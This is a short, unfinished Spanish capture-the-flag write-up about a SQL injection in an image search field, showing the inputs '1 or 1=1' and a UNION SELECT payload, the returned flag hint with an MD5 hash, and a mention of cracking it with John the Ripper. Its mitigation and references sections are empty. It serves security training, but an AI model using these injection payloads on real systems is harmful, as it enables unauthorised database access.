# SQL Injection - Images

Misma vulnerabilidad que [la inyección SQL en la vista de usuarios](./sql_injection_users.md). 

## Ataque

- **Localización: **?

En el apartado de búsqueda de imágenes tenemos un buscador de imágenes por id, en este caso la inyección está un poco más obfuscada ya que no imprime por pantalla el error de la query.

De todas formas, si enviamos como input `1 or 1=1`, recibimos todas las imágenes guardadas en la base de datos.

Inyectamos la siguiente query:
```
1 or 1=1 union select title, comment from list_images
```

Nos devuelve esto:
```
ID:  1 or 1=1 union select title, comment from list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

Crackeamos el hash MD5 con **johntheripper**.

```bash

```
## Mitigación

## Referencias